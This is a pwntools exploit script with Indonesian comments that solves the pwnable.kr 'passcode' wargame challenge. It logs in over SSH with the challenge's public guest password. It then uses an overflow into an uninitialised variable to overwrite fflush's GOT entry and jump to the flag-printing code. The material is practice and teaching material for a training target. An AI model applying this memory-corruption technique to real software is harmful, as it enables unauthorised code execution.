from pwn import *

# Konfigurasi
context.log_level = 'info'

# Koneksi ke server pwnable.kr
# Password: guest
log.info("Connecting to pwnable.kr via SSH...")
try:
    s = ssh(user='passcode', host='pwnable.kr', port=2222, password='guest')
    p = s.process('./passcode')
except Exception as e:
    log.error(f"Connection failed: {e}")
    sys.exit(1)

# --- ANALISIS ---
# 1. Vulnerability: Uninitialized variable 'passcode1' di fungsi login().
#    Fungsi login() menggunakan stack frame yang sama (overlap) dengan fungsi welcome().
#    Variabel 'passcode1' (ebp-0x10) berada pada posisi byte ke-96 dari buffer 'name' (ebp-0x70) di welcome().
#    Kita bisa mengontrol nilai awal 'passcode1' dengan mengirimkan data ke 'name'.
#    scanf("%d", passcode1) akan menulis integer ke alamat yang ditunjuk oleh nilai 'passcode1'.
#    Ini adalah primitif "Write-What-Where" (4 byte write).

# 2. Target:
#    Kita ingin membelokkan eksekusi program ke blok kode yang mencetak flag.
#    Blok ini dimulai dengan pemanggilan getegid() -> setregid() -> system("/bin/cat flag").
#    Alamat blok ini ada di: 0x080492a1 (didapat dari objdump/gdb).
#    
#    Kita akan menimpa entri GOT (Global Offset Table) dari fungsi yang dipanggil segera setelah scanf.
#    Fungsi 'fflush' dipanggil tepat setelah scanf("%d", passcode1).
#    Alamat fflush@got = 0x0804c014 (didapat dari objdump -R passcode).

# 3. Payload Construction:
#    Payload 1 (dikirim ke welcome): 
#       96 byte sampah ('A') + 4 byte alamat fflush@got.
#       Ini akan mengisi 'name' dan overflow tepat ke lokasi 'passcode1'.
#       Setelah ini, nilai 'passcode1' = 0x0804c014.
#    Payload 2 (dikirim ke login - passcode1):
#       Nilai integer desimal dari alamat target (0x080492a1).
#       scanf akan menulis nilai ini ke *passcode1, yaitu ke fflush@got.

# --- EXPLOIT ---

# Alamat Penting
fflush_got = 0x0804c014    # Alamat di mana kita ingin menulis
target_val = 0x080492a1    # Nilai yang ingin kita tulis (alamat instruksi system cat flag)

# Konversi target ke string integer (karena inputnya %d)
target_val_int = str(target_val).encode()

# Payload untuk welcome()
# Mengisi buffer 'name' (100 byte). 96 byte junk + 4 byte address.
payload = b'A' * 96 + p32(fflush_got)

log.info(f"Targeting fflush@got: {hex(fflush_got)}")
log.info(f"Value to write (Address of success block): {hex(target_val)} -> {target_val_int}")

# Interaksi
log.info("Sending payload to welcome()...")
p.recvuntil(b"enter you name : ")
p.sendline(payload)

log.info("Sending target value to login()...")
p.recvuntil(b"enter passcode1 : ")
p.sendline(target_val_int)

# Setelah scanf selesai, program memanggil fflush(stdin).
# Karena fflush@got sudah diganti, program akan melompat ke target kita.
log.success("Exploit sent! Checking for flag...")

# Menerima output
# Kita switch ke interactive atau baca semua output
try:
    p.interactive()
except Exception as e:
    log.info("Connection closed.")
